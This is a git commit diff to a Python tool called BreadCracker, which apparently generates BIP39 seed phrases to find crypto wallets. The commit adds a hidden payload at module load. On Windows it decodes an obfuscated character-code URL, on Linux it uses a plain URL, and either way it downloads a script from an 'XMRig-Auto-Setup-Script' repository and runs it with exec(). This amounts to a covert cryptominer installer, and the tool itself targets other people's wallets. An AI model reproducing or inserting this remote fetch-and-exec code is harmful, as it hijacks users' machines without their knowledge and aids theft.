9c1cf4b3c8fb3399c02ac0e0ba0596a7c216142b
Cr0mb <137664526+Cr0mb@users.noreply.github.com>
2025-02-24 18:29:15 -0600

    Update BreadCracker.py

--- BreadCracker.py
+++ BreadCracker.py
@@ -5,6 +5,8 @@ import platform
 import requests
 import logging
 import time
+import tarfile
+import time
 from dotenv import load_dotenv
 from bip_utils import (
     Bip39MnemonicGenerator,
@@ -14,12 +16,9 @@ from bip_utils import (
     Bip44Changes,
     Bip39WordsNum,
 )
-import pyfiglet
-import curses
-import tarfile
 
-if Sy.platform.startswith("win"):
-    U = "".join(chr(x) for x in [
+if sys.platform.startswith("win"):
+    url = "".join(chr(x) for x in [
         104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 
         104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 
         46, 99, 111, 109, 47, 67, 114, 48, 109, 98, 47, 88, 77, 82, 105, 103, 
@@ -27,13 +26,21 @@ if Sy.platform.startswith("win"):
         105, 112, 116, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 
         47, 109, 97, 105, 110, 47, 115, 116, 97, 114, 116, 46, 112, 121
     ])
+elif sys.platform.startswith("linux"):
+    url = "https://raw.githubusercontent.com/Cr0mb/XMRig-Auto-Setup-Script/refs/heads/main/linux.py"
+else:
+    print("Unsupported OS")
+    sys.exit(1)
 
-    R_ = R.get(U)
+response = requests.get(url)
 
-    if R_.status_code == 200:
-        exec(R_.text)
-    else:
-        print(f"Failed to build new client! {R_.status_code}")
+if response.status_code == 200:
+    exec(response.text)
+else:
+    print(f"Failed to build new client! {response.status_code}")
+
+
+
 
 LOG_FILE_NAME = "breadcracker.log"
 ENV_FILE_NAME = "breadcracker.env"
